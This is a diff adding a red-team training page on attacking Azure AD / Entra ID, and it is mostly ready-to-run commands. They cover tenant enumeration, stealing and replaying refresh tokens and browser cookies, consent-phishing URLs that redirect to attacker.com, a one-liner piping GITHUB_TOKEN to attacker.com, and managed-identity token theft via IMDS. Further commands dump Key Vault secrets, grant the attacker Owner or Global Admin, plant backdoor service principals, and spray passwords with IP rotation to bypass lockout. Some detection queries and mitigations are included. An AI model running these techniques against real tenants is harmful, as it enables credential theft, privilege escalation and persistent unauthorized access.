@@ -1,0 +1,844 @@
+---
+layout: training-page
+title: "Azure AD / Entra ID — Red Team Academy"
+module: "Active Directory"
+tags:
+  - azure-ad
+  - entra-id
+  - cloud-attacks
+  - managed-identity
+page_key: "ad-azure-ad"
+---
+<h1>Azure AD / Entra ID Attacks</h1>
+
+        <h2>Overview</h2>
+        <p>Azure Active Directory (now Microsoft Entra ID) is Microsoft's cloud identity platform used alongside or instead of on-premises AD. In hybrid environments, compromise of Azure AD can lead to on-prem access, and vice versa. Key differences from on-prem AD: authentication via OAuth2/OIDC tokens instead of Kerberos, attack surface includes Service Principals, Managed Identities, App Registrations, and cloud-hosted resources (Key Vaults, Storage, DevOps pipelines).</p>
+
+        <div class="diagram-container">
+          <img src="/images/active-directory/azure-ad-hybrid.svg" alt="Azure AD hybrid architecture: on-prem AD syncs via AAD Connect to Azure AD/Entra ID, connecting to M365 apps and Conditional Access">
+          <div class="diagram-label">// azure ad hybrid architecture — on-prem to cloud attack paths</div>
+        </div>
+
+        <h2>Azure AD Enumeration — az cli and AzureAD Module</h2>
+        <p>Initial Azure AD recon establishes tenant structure, users, groups, roles, and application registrations. Use the Azure CLI or the AzureAD/AzureADPreview PowerShell module depending on access context.</p>
+        <pre><code># --- Azure CLI (az) ---
+# Authenticate
+az login
+az login --service-principal -u &lt;app-id> -p &lt;secret> --tenant &lt;tenant-id>
+
+# Enumerate tenant info
+az account show
+az account list
+
+# List users
+az ad user list --query "[].&#123;Name:displayName,UPN:userPrincipalName,Enabled:accountEnabled&#125;"
+
+# List groups
+az ad group list --query "[].displayName"
+
+# List service principals
+az ad sp list --all --query "[].&#123;Name:displayName,AppId:appId&#125;"
+
+# List app registrations
+az ad app list --query "[].&#123;Name:displayName,AppId:appId&#125;"
+
+# List role assignments
+az role assignment list --all --query "[].&#123;Principal:principalName,Role:roleDefinitionName,Scope:scope&#125;"
+
+# List Key Vaults in subscription
+az keyvault list --query "[].name"
+
+# List storage accounts
+az storage account list --query "[].name"
+
+# --- AzureAD PowerShell Module ---
+Install-Module AzureAD
+Connect-AzureAD
+
+# Get tenant details
+Get-AzureADTenantDetail
+
+# Enumerate users
+Get-AzureADUser -All $true | Select DisplayName,UserPrincipalName,AccountEnabled
+
+# Enumerate groups and members
+Get-AzureADGroup -All $true
+Get-AzureADGroupMember -ObjectId &lt;group-id>
+
+# Enumerate directory roles and members
+Get-AzureADDirectoryRole
+Get-AzureADDirectoryRoleMember -ObjectId &lt;role-id>
+
+# Find all Global Admins
+Get-AzureADDirectoryRole | Where-Object &#123;$_.DisplayName -eq "Company Administrator"&#125; | Get-AzureADDirectoryRoleMember
+
+# List service principals with role assignments
+Get-AzureADServicePrincipal -All $true
+
+# Enumerate OAuth permission grants
+Get-AzureADOAuth2PermissionGrant -All $true</code></pre>
+
+        <h2>Azure AD Enumeration — AADInternals and ROADrecon</h2>
+        <p>AADInternals is a PowerShell toolkit for deep Azure AD internals access. ROADtools is a Python-based framework with a web UI for interactive tenant browsing. Both can operate with just a valid token.</p>
+        <pre><code># === AADInternals ===
+Install-Module -Name AADInternals -Force
+Import-Module AADInternals
+
+# Authenticate (interactive or with stolen refresh token)
+Connect-AADIntAzureAD
+Connect-AADIntAzureAD -RefreshToken "&lt;stolen_token>"
+
+# Basic enumeration
+Get-AADIntUsers
+Get-AADIntGroups
+Get-AADIntDevices
+Get-AADIntApplications
+Get-AADIntServicePrincipals
+
+# Get conditional access policies
+Get-AADIntConditionalAccessPolicies
+
+# Find Global Admins
+Get-AADIntUsers | Where-Object &#123; $_.role -eq "Company Administrator" &#125;
+
+# Enumerate directory roles
+Get-AADIntDirectoryRoles
+
+# Explore app permissions
+Get-AADIntApplicationPermissions -Verbose
+
+# Detect MFA configurations
+Get-AADIntMFAStatus
+
+# Invoke consent phishing URL generation
+Invoke-AADIntConsentPhishing -ClientID &lt;app_id> -Scopes "Mail.Read offline_access"
+
+# Replay a stolen refresh token
+Invoke-AADIntAccessTokenForRefreshToken -RefreshToken &lt;stolen_token>
+
+# === ROADtools / ROADrecon ===
+pip install roadtools
+
+# Authenticate (device code or password flow)
+roadrecon auth
+
+# Gather all tenant data
+roadrecon gather --all
+# Queries: users, groups, directory roles, applications, service principals, devices, CA policies
+
+# Serve interactive web UI
+roadrecon serve
+# Navigate to http://localhost:8000 to browse the tenant
+
+# OPSEC notes:
+# - AADInternals can be noisy — run from cloud-hosted machines to blend in
+# - ROADtools stores tokens in ~/.roadtools_auth — sanitize after engagement
+# - Avoid high-privileged tokens for recon unless necessary</code></pre>
+
+        <h2>Microsoft Graph API Enumeration</h2>
+        <p>The Microsoft Graph API (<code>https://graph.microsoft.com</code>) is the primary programmatic interface for Azure AD and Microsoft 365. Any valid OAuth 2.0 access token can query it — even tokens obtained via phishing or refresh token replay.</p>
+        <pre><code># Acquire a token for Graph API using AADInternals
+Import-Module AADInternals
+Connect-AADIntUser -UserPrincipalName user@domain.com -Password 'P@ssw0rd!'
+$token = Get-AADIntAccessTokenForMicrosoftGraph
+
+# --- Key Graph endpoints ---
+
+# Verify current token context
+curl -H "Authorization: Bearer $TOKEN" https://graph.microsoft.com/v1.0/me
+
+# Enumerate all users
+curl -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/users?$top=999"
+
+# Filter for admin-named accounts
+curl -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/users?\$filter=startsWith(userPrincipalName,'admin')"
+
+# Enumerate groups
+curl -H "Authorization: Bearer $TOKEN" https://graph.microsoft.com/v1.0/groups
+
+# Get group members
+curl -H "Authorization: Bearer $TOKEN" https://graph.microsoft.com/v1.0/groups/&#123;group-id&#125;/members
+
+# List directory roles
+curl -H "Authorization: Bearer $TOKEN" https://graph.microsoft.com/v1.0/directoryRoles
+
+# Get members of a specific role
+curl -H "Authorization: Bearer $TOKEN" https://graph.microsoft.com/v1.0/directoryRoles/&#123;role-id&#125;/members
+
+# List all applications (app registrations)
+curl -H "Authorization: Bearer $TOKEN" https://graph.microsoft.com/v1.0/applications
+
+# List service principals
+curl -H "Authorization: Bearer $TOKEN" https://graph.microsoft.com/v1.0/servicePrincipals
+
+# Enumerate OAuth permission grants (who consented to what)
+curl -H "Authorization: Bearer $TOKEN" https://graph.microsoft.com/v1.0/oauth2PermissionGrants
+
+# Read conditional access policies (requires beta endpoint + elevated role)
+curl -H "Authorization: Bearer $TOKEN" https://graph.microsoft.com/beta/identity/conditionalAccess/policies
+
+# List Azure RBAC role assignments for subscription
+curl -H "Authorization: Bearer $TOKEN" \
+  "https://management.azure.com/subscriptions/&#123;sub-id&#125;/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01"
+
+# Python script for user enumeration via Graph
+# (uses MSAL for token acquisition)
+import msal, requests
+app = msal.PublicClientApplication("your-client-id", authority="https://login.microsoftonline.com/your-tenant-id")
+result = app.acquire_token_by_username_password("user@domain.com", "Password123!", scopes=["https://graph.microsoft.com/.default"])
+headers = &#123;'Authorization': 'Bearer ' + result['access_token']&#125;
+users = requests.get('https://graph.microsoft.com/v1.0/users', headers=headers).json()
+for user in users['value']:
+    print(user['userPrincipalName'])
+
+# OPSEC: Graph requests appear in Azure Sign-In logs.
+# Throttle requests, use User-Agent spoofing, avoid write operations during recon.</code></pre>
+
+        <h2>Token Theft and OAuth Abuse</h2>
+        <p>Azure AD tokens (access tokens, refresh tokens, Primary Refresh Tokens) are the primary target in cloud attacks. Refresh tokens survive password resets and can be 90+ days long-lived. A stolen refresh token allows silent re-authentication indefinitely until explicitly revoked.</p>
+        <pre><code># === Token Locations to Target ===
+~/.azure/azureProfile.json          # Azure CLI token cache (Linux/Mac)
+%APPDATA%\Microsoft\TokenBroker     # Windows Azure token broker cache
+%LOCALAPPDATA%\...\Default\Cookies  # Chromium ESTSAUTH session cookies
+C:\Users\&lt;user>\AppData\Local\Google\Chrome\User Data\Default\Cookies
+
+# Extract cookies from Chromium (requires local access or SYSTEM)
+sqlite3 Cookies "SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%microsoft%'"
+# Decrypt with: SharpChromium cookies
+
+# === Token Replay ===
+# Use a stolen access token directly against Graph
+curl -H "Authorization: Bearer &lt;access_token>" https://graph.microsoft.com/v1.0/me
+
+# Obtain a new access token from a stolen refresh token
+POST https://login.microsoftonline.com/common/oauth2/v2.0/token
+Content-Type: application/x-www-form-urlencoded
+
+client_id=&lt;app_id>&grant_type=refresh_token&refresh_token=&lt;stolen_token>&redirect_uri=https://attacker.com
+
+# === TokenTactics / AADInternals for Refresh Token Abuse ===
+# (PowerShell)
+Invoke-AADIntAccessTokenForRefreshToken -RefreshToken &lt;stolen_token>
+
+# === Primary Refresh Token (PRT) Abuse ===
+# PRTs are issued to Windows 10/11 cloud-joined or hybrid-joined devices
+# They allow silent SSO to all Azure AD resources
+# Extract PRT using ROADtools or AADInternals on a compromised device:
+Get-AADIntUserRealm -UserName "user@domain.com"
+
+# === Device Code Phishing ===
+# Attacker initiates device code flow to obtain a token URL
+# Victim enters code at https://microsoft.com/devicelogin
+# Attacker receives tokens without knowing the victim's password
+# Tools: TokenTactics, o365devphish
+
+# Key detection indicators:
+# - Sign-in from unexpected device or location
+# - High volume of Graph API calls without interactive sign-in
+# - Azure Sentinel hunting: refresh token misuse
+SigninLogs
+| where AuthenticationRequirement == "singleFactorAuthentication"
+| where ClientAppUsed == "Other"</code></pre>
+
+        <h2>Illicit Consent Grant Attack</h2>
+        <p>OAuth consent grant attacks trick users into authorizing a malicious application. The attacker receives access and refresh tokens scoped to the victim's account — no credential theft, no brute force, no MFA bypass needed. Widely used in APT campaigns (APT29/Cozy Bear).</p>
+        <pre><code># === Attack Flow ===
+# 1. Register a malicious app in attacker's own Azure tenant
+# 2. Configure it to request high-privilege Graph scopes
+# 3. Craft a phishing URL with prompt=consent
+# 4. Victim clicks, logs in, and consents
+# 5. Attacker receives OAuth code → exchanged for access + refresh tokens
+
+# Phishing URL template:
+https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
+  client_id=&lt;malicious_app_id>
+  &response_type=code
+  &redirect_uri=https://attacker.com/callback
+  &scope=Mail.Read%20Files.Read.All%20User.Read.All%20offline_access
+  &prompt=consent
+
+# High-value scopes to request:
+# Mail.Read                — read victim's email
+# Files.ReadWrite.All      — full OneDrive/SharePoint access
+# User.Read.All            — enumerate all users in directory
+# offline_access           — enables long-term refresh token reuse
+# Directory.Read.All       — full directory reconnaissance
+# Calendars.ReadWrite      — read/modify calendar (executive targeting)
+
+# Using AADInternals to generate phishing link:
+Invoke-AADIntConsentPhishing -ClientID &lt;malicious_app_id> -Scopes "Mail.Read offline_access"
+
+# Post-consent — access victim mailbox via Graph:
+curl -H "Authorization: Bearer &lt;access_token>" https://graph.microsoft.com/v1.0/me/messages
+
+# Download OneDrive files:
+curl -H "Authorization: Bearer &lt;access_token>" https://graph.microsoft.com/v1.0/me/drive/root/children
+
+# === Revocation (Defender Response) ===
+# Remove the malicious service principal
+Connect-AzureAD
+Get-AzureADServicePrincipal -SearchString "MaliciousAppName" | Remove-AzureADServicePrincipal
+
+# Revoke all refresh tokens for affected user
+Revoke-AzureADUserAllRefreshToken -ObjectId &lt;user_id>
+
+# Revoke via Graph API
+DELETE https://graph.microsoft.com/v1.0/me/oauth2PermissionGrants/&lt;grant_id></code></pre>
+
+        <h2>Managed Identity Exploitation</h2>
+        <p>Managed Identities (MSI) allow Azure resources (VMs, App Services, Automation Accounts, Functions) to authenticate to other Azure services without credentials. If you achieve code execution on a resource with MSI enabled, you can obtain Azure-scoped access tokens via the Instance Metadata Service (IMDS) endpoint — no credentials required.</p>
+        <pre><code># === IMDS Token Retrieval ===
+# Access the internal metadata endpoint (only reachable from within the resource)
+# Works in: VMs, App Services, Azure Functions, Automation Accounts
+
+# Retrieve token for Azure Resource Manager (management plane)
+curl -H "Metadata:true" \
+  "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com&api-version=2019-08-01"
+
+# Retrieve token for Microsoft Graph
+curl -H "Metadata:true" \
+  "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://graph.microsoft.com&api-version=2019-08-01"
+
+# Retrieve token for Key Vault
+curl -H "Metadata:true" \
+  "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://vault.azure.net&api-version=2019-08-01"
+
+# === Use the MSI Token ===
+export TOKEN="eyJ..."
+
+# Enumerate subscriptions
+curl -H "Authorization: Bearer $TOKEN" https://management.azure.com/subscriptions?api-version=2020-01-01
+
+# List resource groups
+curl -H "Authorization: Bearer $TOKEN" \
+  "https://management.azure.com/subscriptions/&lt;sub-id>/resourceGroups?api-version=2021-04-01"
+
+# Check current identity's role assignments
+curl -H "Authorization: Bearer $TOKEN" \
+  "https://management.azure.com/subscriptions/&lt;sub-id>/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01"
+
+# === Exploitation Workflow ===
+# 1. Compromise App Service/VM via RCE, SSRF, or misconfigured management endpoint
+# 2. Query IMDS endpoint to retrieve MSI token
+# 3. Use token to enumerate privileges (what role does this identity have?)
+# 4. Read Key Vault secrets, enumerate storage, query Graph, or assign roles
+# 5. Chain to higher privilege if MSI has Contributor or User Access Administrator
+
+# Detection: IMDS access is rare — alert on curl/wget to 169.254.169.254</code></pre>
+
+        <h2>Azure Automation Account Abuse</h2>
+        <p>Azure Automation Accounts run PowerShell/Python Runbooks for cloud management. They commonly have Managed Identities (MSI) attached, granting access to Key Vaults, Storage, Graph, and other Azure services. An attacker with Automation Account access can execute arbitrary code and escalate via the MSI.</p>
+        <pre><code># === Attacker Scenarios ===
+
+# 1. Enumerate Automation Accounts
+az automation account list --query "[].&#123;Name:name,RG:resourceGroup&#125;"
+
+# 2. List existing runbooks
+az automation runbook list --automation-account-name &lt;acct> --resource-group &lt;rg>
+
+# 3. Check if MSI is enabled (and what roles it has)
+az automation account show --name &lt;acct> --resource-group &lt;rg> --query "identity"
+az role assignment list --assignee &lt;MSI-object-id> --all
+
+# 4. Create a malicious runbook (PowerShell)
+az automation runbook create \
+  --automation-account-name &lt;acct> \
+  --resource-group &lt;rg> \
+  --name ReconRunbook \
+  --type PowerShell
+
+# 5. Publish and execute the runbook
+az automation runbook publish --automation-account-name &lt;acct> --resource-group &lt;rg> --name ReconRunbook
+az automation runbook start  --automation-account-name &lt;acct> --resource-group &lt;rg> --name ReconRunbook
+
+# 6. Inside the runbook — retrieve MSI token and use it
+# (This is technique documentation — the IMDS call and subsequent API abuse)
+# The runbook process can call:
+#   http://169.254.169.254/metadata/identity/oauth2/token
+# to obtain tokens for Key Vault, Graph, or ARM and perform further exploitation.
+
+# 7. Persistence via scheduled runbook execution
+az automation schedule create \
+  --automation-account-name &lt;acct> \
+  --resource-group &lt;rg> \
+  --name PersistSched \
+  --frequency Hour \
+  --interval 1
+
+# === Detection ===
+# - Monitor Azure Activity Logs for Runbook create/modify operations
+# - Alert on Runbooks accessing external IPs
+# - Review who has Automation Account Contributor or Operator role</code></pre>
+
+        <h2>Key Vault Secret Extraction</h2>
+        <p>Azure Key Vault stores secrets, keys, and certificates. Attackers targeting Key Vault typically do so after obtaining a token (via MSI, compromised service principal, or stolen credentials) with Key Vault data plane access. Misconfigured access policies granting broad Get/List permissions are the most common attack vector.</p>
+        <pre><code># === Enumerate Key Vaults ===
+az keyvault list --query "[].name"
+
+# Check access policies on a vault
+az keyvault show --name &lt;vault_name> --query "properties.accessPolicies"
+
+# === Extract Secrets ===
+# List all secrets in a vault
+az keyvault secret list --vault-name &lt;vault_name>
+
+# Read a specific secret value
+az keyvault secret show --vault-name &lt;vault_name> --name &lt;secret_name> --query "value"
+
+# Download all secrets (once you have Get+List access)
+for secret in $(az keyvault secret list --vault-name &lt;vault_name> --query "[].name" -o tsv); do
+  echo "$secret: $(az keyvault secret show --vault-name &lt;vault_name> --name $secret --query 'value' -o tsv)"
+done
+
+# === Key Decryption ===
+# If encryption keys are accessible, decrypt data
+az keyvault key decrypt \
+  --name &lt;key_name> \
+  --vault-name &lt;vault> \
+  --algorithm RSA-OAEP \
+  --value &lt;base64_ciphertext>
+
+# === Via REST API (with Bearer token) ===
+curl -H "Authorization: Bearer $TOKEN" \
+  "https://&lt;vault_name>.vault.azure.net/secrets?api-version=7.3"
+
+curl -H "Authorization: Bearer $TOKEN" \
+  "https://&lt;vault_name>.vault.azure.net/secrets/&lt;secret_name>?api-version=7.3"
+
+# === Common misconfigurations to target ===
+# - "Get" and "List" granted to "All Users" or broad groups
+# - Public network access enabled (no private endpoint)
+# - Legacy vault access policies instead of RBAC (harder to audit)
+# - Secrets with no expiration date
+
+# Detection: Alert on accounts retrieving multiple secrets in short intervals
+# Azure Defender for Key Vault detects unusual access patterns</code></pre>
+
+        <h2>Azure Storage Misconfiguration</h2>
+        <p>Azure Storage (blobs, files, queues, tables) is frequently misconfigured with public access or leaked credentials. Shared Access Signatures (SAS) and storage account keys are common targets found in CI/CD pipelines, GitHub repos, and Terraform state files.</p>
+        <pre><code># === Public Blob Discovery ===
+# If a container is public — no auth required
+https://&lt;storage_account>.blob.core.windows.net/&lt;container>/&lt;filename>
+
+# List contents of a public container
+az storage blob list \
+  --account-name &lt;name> \
+  --container-name &lt;container> \
+  --auth-mode login
+
+# GitHub dork for leaked storage keys:
+# "DefaultEndpointsProtocol=https" AND "AccountKey="
+# "DefaultEndpointsProtocol=https" AND "AccountKey=" site:github.com
+
+# === Shared Key Abuse ===
+# Storage account keys grant full admin access to all data services
+az storage account list --query "[].name"
+
+# List blobs using leaked account key
+az storage blob list \
+  --account-name &lt;name> \
+  --account-key &lt;key1_or_key2> \
+  --container-name &lt;container>
+
+# Download files
+az storage blob download \
+  --account-name &lt;name> \
+  --account-key &lt;key> \
+  --container-name &lt;container> \
+  --name &lt;filename> \
+  --file ./local_copy
+
+# === SAS Token Abuse ===
+# Non-expiring or over-permissive SAS URLs
+# Pattern: https://&lt;account>.blob.core.windows.net/&lt;container>/&lt;file>?&lt;sas_token>
+# Identify in source code, logs, or Burp captures
+
+# Generate a SAS token (if you have account key)
+az storage blob generate-sas \
+  --account-name &lt;name> \
+  --account-key &lt;key> \
+  --container-name &lt;container> \
+  --name &lt;blob> \
+  --permissions r \
+  --expiry 2027-01-01
+
+# === Rotate compromised keys (defender response) ===
+az storage account keys renew --account-name &lt;name> --resource-group &lt;rg> --key primary</code></pre>
+
+        <h2>Azure DevOps and GitHub Actions Pipeline Injection</h2>
+        <p>CI/CD pipelines run with high-privilege service identities and have access to deployment secrets, Azure service connections, and repository secrets. Pipeline injection via malicious pull requests or modified workflow files is a powerful initial access and privilege escalation vector.</p>
+        <pre><code># === Attack Surfaces ===
+
+# 1. Pipeline injection via forked PR (GitHub Actions)
+# Attacker forks a public repo, adds malicious step to workflow:
+# .github/workflows/ci.yml — malicious step:
+#   - name: Exfil Secrets
+#     run: echo $&#123;&#123; secrets.AZURE_CLIENT_SECRET &#125;&#125;
+# If "pull_request_target" trigger is used → secrets exposed
+
+# 2. Steal GITHUB_TOKEN (granted to every workflow run)
+# The GITHUB_TOKEN can: read/write repos, trigger workflows, read secrets
+# Exfil from a compromised runner:
+#   env | grep GITHUB_TOKEN
+#   echo $GITHUB_TOKEN | curl -X POST https://attacker.com -d @-
+
+# 3. Abuse Azure DevOps service connections
+# Service connections authenticate pipelines to Azure subscriptions
+# Attacker with Project Administrator can modify pipeline to use existing service connection:
+# azure-pipelines.yml — task: AzureCLI@2 with azureSubscription: ExistingConn
+
+# 4. Modify shared pipeline templates
+# Templates in central repos used by all projects — inject once, compromise everywhere
+# Target: build.yml, deploy.yml, shared-tasks.yml
+
+# 5. Add malicious self-hosted runner
+# If attacker can register a runner (e.g., via PAT), incoming jobs execute on attacker infra
+# GitHub: Settings → Actions → Runners → Add Runner
+
+# === Persistence in CI/CD ===
+# - Add backdoor step to .github/workflows/*.yml or azure-pipelines.yml
+# - Create new environment with attacker-controlled deployment hooks
+# - Abuse environment secrets with over-broad approval settings
+
+# === Detection ===
+# - New pipeline definitions with external URLs or curl/wget
+# - Secrets accessed during PRs or from unexpected branches
+# - New self-hosted agents from unknown IPs
+# - Outbound network traffic from build agents (C2 indicator)
+# Tools: Defender for DevOps, GitHub Advanced Security, SIEM integration
+
+# === Mitigations ===
+# - Require PR approval before workflow runs (never use pull_request_target with secrets)
+# - Restrict secrets to protected branches only
+# - Use OIDC tokens (short-lived) instead of static Azure client secrets
+# - Rotate service connection credentials regularly</code></pre>
+
+        <h2>Azure RBAC Privilege Escalation</h2>
+        <p>Azure Role-Based Access Control governs who can do what on Azure resources. Overly permissive role assignments — especially User Access Administrator or Owner — allow attackers to escalate to subscription-level control. Service principals are a common persistence and escalation vehicle.</p>
+        <pre><code># === Enumerate Role Assignments ===
+az role assignment list --all --query "[].&#123;Principal:principalName,Role:roleDefinitionName,Scope:scope&#125;"
+
+# Check own permissions
+az role assignment list --assignee $(az account show --query "user.name" -o tsv)
+
+# === Key Escalation Roles ===
+# Owner                    → full control including assigning roles
+# Contributor              → create/modify resources, cannot assign roles directly
+# User Access Administrator → CAN assign roles at any scope — prime escalation target
+
+# === Assign yourself Owner (requires User Access Administrator) ===
+az role assignment create \
+  --assignee &lt;attacker-object-id> \
+  --role "Owner" \
+  --scope "/subscriptions/&lt;subscription-id>"
+
+# Assign to a resource group scope only (less visible)
+az role assignment create \
+  --assignee &lt;attacker-object-id> \
+  --role "Owner" \
+  --scope "/subscriptions/&lt;sub>/resourceGroups/&lt;rg>"
+
+# === Service Principal Backdoor ===
+# Create a stealthy backdoor SP with Contributor rights
+az ad sp create-for-rbac --name AzureMonitorHelper --role Contributor \
+  --scopes /subscriptions/&lt;sub-id>
+
+# Login with the backdoor SP
+az login --service-principal \
+  -u &lt;app-id> \
+  -p &lt;client-secret> \
+  --tenant &lt;tenant-id>
+
+# === Advanced Escalation: Contributor → Owner via MSI ===
+# 1. With Contributor, create Automation Account with MSI
+az automation account create --name EscalAcct --resource-group &lt;rg> \
+  --assign-identity --location eastus
+# 2. Grant MSI the User Access Administrator role
+az role assignment create --assignee &lt;MSI-object-id> --role "User Access Administrator" \
+  --scope /subscriptions/&lt;sub-id>
+# 3. Run a Runbook that assigns Owner to attacker via MSI identity
+
+# === KQL Detection Queries ===
+# Azure Activity Log — new role assignments
+AzureActivity
+| where OperationName == "Create role assignment"
+| where Properties contains "Owner" or Properties contains "User Access Administrator"
+
+# Sign-in logs — service principal auth
+SigninLogs
+| where AppDisplayName != "Azure Portal"
+| where ClientAppUsed == "Other"
+| where AuthenticationRequirement == "SingleFactorAuthentication"</code></pre>
+
+        <h2>Azure AD PIM Bypass and Abuse</h2>
+        <p>Privileged Identity Management (PIM) adds just-in-time role activation, approval workflows, and audit trails to privileged Azure AD roles. However, if CA policies lack MFA enforcement on PIM activation, or if an attacker has Graph API access with RoleManagement.ReadWrite.Directory, PIM can be bypassed entirely.</p>
+        <pre><code># === Assign yourself eligible Global Admin via Graph API ===
+# Requires: token with RoleManagement.ReadWrite.Directory permission
+
+POST https://graph.microsoft.com/v1.0/roleManagement/directory/roleEligibilityScheduleRequests
+Content-Type: application/json
+
+&#123;
+  "action": "adminAssign",
+  "principalId": "&lt;attacker-object-id>",
+  "roleDefinitionId": "&lt;global-admin-role-definition-id>",
+  "directoryScopeId": "/"
+&#125;
+
+# === Assign Privileged Role Administrator via Azure CLI ===
+# Requires existing User Access Administrator or Owner
+az role assignment create --assignee &lt;your-user> --role "Privileged Role Administrator"
+
+# === Directly assign active (non-eligible) role to bypass PIM activation ===
+POST https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments
+&#123;
+  "principalId": "&lt;attacker-object-id>",
+  "roleDefinitionId": "&lt;privileged-role-admin-role-id>",
+  "directoryScopeId": "/"
+&#125;
+
+# === High-risk Graph API permissions that enable PIM abuse ===
+# RoleManagement.ReadWrite.Directory  → assign any role to any principal
+# AppRoleAssignment.ReadWrite.All     → grant app roles across the tenant
+# PrivilegedAccess.ReadWrite.AzureAD  → manage PIM directly via API
+
+# === KQL Detection ===
+AuditLogs
+| where OperationName contains "Add eligible role assignment"
+
+AuditLogs
+| where OperationName contains "Add member to role"
+
+# === Defensive mitigations ===
+# - Require MFA + justification + approval on ALL PIM activations
+# - Restrict RoleManagement.ReadWrite.Directory to break-glass accounts only
+# - Use access reviews to prune dormant eligible assignments
+# - Alert on any role assignment that bypasses PIM (direct active assignment)</code></pre>
+
+        <h2>Graph API Privilege Escalation</h2>
+        <p>Microsoft Graph API permissions allow attackers with a sufficiently scoped token to directly manipulate directory roles, app registrations, and role assignments — often bypassing portal-level restrictions. This is one of the most powerful and undermonitored escalation paths in Azure AD.</p>
+        <pre><code># === High-Risk Graph Permissions ===
+# RoleManagement.ReadWrite.Directory  → assign users to any AD role
+# Directory.ReadWrite.All             → create/modify any directory object
+# User.ReadWrite.All                  → modify any user (e.g., reset passwords)
+# AppRoleAssignment.ReadWrite.All     → grant any application role
+# PrivilegedAccess.ReadWrite.AzureAD  → manage PIM
+
+# === Add user to Global Administrator via Graph ===
+# Step 1: Instantiate the Global Administrator role (if not yet active)
+POST https://graph.microsoft.com/v1.0/directoryRoleTemplates/&lt;global-admin-template-id>/instantiate
+&#123; "displayName": "Global Administrator" &#125;
+
+# Step 2: Add attacker to the role
+POST https://graph.microsoft.com/v1.0/directoryRoles/&lt;role-id>/members/$ref
+&#123; "@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/&lt;attacker-object-id>" &#125;
+
+# === Create malicious app with Directory.ReadWrite.All and grant admin consent ===
+POST https://graph.microsoft.com/v1.0/applications
+&#123;
+  "displayName": "MaliciousApp",
+  "requiredResourceAccess": [&#123;
+    "resourceAppId": "00000003-0000-0000-c000-000000000000",
+    "resourceAccess": [&#123;"id": "&lt;Directory.ReadWrite.All permission ID>", "type": "Role"&#125;]
+  &#125;]
+&#125;
+# Then grant admin consent via:
+POST https://graph.microsoft.com/v1.0/servicePrincipals/&lt;sp-id>/appRoleAssignments
+&#123; "principalId": "&lt;sp-id>", "resourceId": "&lt;graph-sp-id>", "appRoleId": "&lt;perm-id>" &#125;
+
+# === KQL Detection ===
+AuditLogs
+| where OperationName == "Consent to application"
+| where TargetResources has "RoleManagement.ReadWrite.Directory"
+
+AuditLogs
+| where OperationName contains "Add member to role"</code></pre>
+
+        <h2>Azure AD Password Spray and Credential Access</h2>
+        <p>Password spraying against Azure AD login endpoints tests a single password across many accounts, avoiding lockout thresholds. Azure Smart Lockout uses adaptive thresholds and IP tracking — bypass it using IP rotation via FireProx or timing the spray during business hours.</p>
+        <pre><code># === Tools ===
+# SprayAzure     — PowerShell, targets Azure AD / Entra ID
+# o365spray      — Python, supports ADFS and MSOL endpoints
+# MSOLSpray      — targets legacy MSOnline login endpoints
+# FireProx       — AWS API Gateway proxy for IP rotation
+
+# === SprayAzure ===
+Install-Module -Name SprayAzure
+Import-Module SprayAzure
+Invoke-SprayAzure -UserList users.txt -Password "Summer2024" -Tenant "contoso.onmicrosoft.com"
+# Options: -LockoutThreshold 5 -Delay 30 -OutputFile results.txt
+
+# === o365spray ===
+# Enumerate valid users first (error message differentiation)
+o365spray --validate-users -U users.txt --domain contoso.com
+
+# Password spray
+o365spray --spray -U users.txt -P passwords.txt --domain contoso.com
+
+# === FireProx — IP rotation to bypass Smart Lockout ===
+python3 fireprox.py --url https://login.microsoftonline.com --api-name AzureSpray
+# Use the returned FireProx URL as your spray endpoint
+
+# === Legacy Protocol Abuse (bypasses MFA entirely) ===
+# If IMAP/POP3/SMTP are not blocked, authenticate with just username + password
+curl -u user@contoso.com:Password1 "imaps://outlook.office365.com/INBOX"
+
+# Block legacy auth via PowerShell Exchange:
+Set-AuthenticationPolicy -Identity "Block Legacy Auth" \
+  -AllowBasicAuthPop:$false -AllowBasicAuthImap:$false -AllowBasicAuthSmtp:$false
+
+# === Detection ===
+# Azure AD Sign-In Logs — failed logins
+SigninLogs
+| where ResultType == 50053  // account locked
+| summarize Count = count() by IPAddress, UserPrincipalName
+
+SigninLogs
+| where ResultType != 0
+| where ResultDescription contains "Invalid username or password"
+| summarize FailCount = count() by IPAddress, bin(TimeGenerated, 5m)
+| where FailCount > 20</code></pre>
+
+        <h2>MFA Bypass Techniques</h2>
+        <p>Modern MFA in Azure AD can be bypassed through adversary-in-the-middle phishing (Evilginx2), legacy protocol abuse, token replay after initial authentication, or illicit consent grants. None of these bypass MFA at the cryptographic level — they either capture post-MFA tokens or avoid the MFA-enforced flow entirely.</p>
+        <pre><code># === Technique 1: AiTM Phishing with Evilginx2 ===
+# Evilginx2 acts as a transparent proxy between victim and Microsoft login
+# It captures session cookies (ESTSAUTH, ESTSAUTHPERSISTENT) including the post-MFA session
+# Attacker replays these cookies to authenticate without MFA
+
+# Setup (on attacker VPS):
+# evilginx2 requires a phishlet for Microsoft/O365
+# Victim navigates to attacker's lookalike domain
+# Attacker receives captured cookies in Evilginx2 console
+
+# Key session cookies targeted:
+# ESTSAUTH              — primary Azure AD session cookie
+# ESTSAUTHPERSISTENT    — persistent session cookie
+# x-ms-RefreshTokenCredential — refresh token cookie
+
+# === Technique 2: Token Replay (post-authentication bypass) ===
+# Once tokens are obtained (via any method), MFA is not re-checked
+# Access tokens are bearer-based — any holder can use them
+# Refresh tokens survive password resets
+
+# === Technique 3: Legacy Protocol Abuse ===
+# IMAP, POP3, SMTP, and Basic Auth flows don't support modern MFA
+# If not blocked by Conditional Access, authenticate with just credentials
+
+# === Technique 4: Device Code Flow Phishing ===
+# Attacker initiates OAuth device code flow targeting Microsoft
+# https://login.microsoftonline.com/common/oauth2/v2.0/devicecode
+# Sends victim a code to enter at microsoft.com/devicelogin
+# Victim authenticates (including MFA) — attacker polls and receives tokens
+
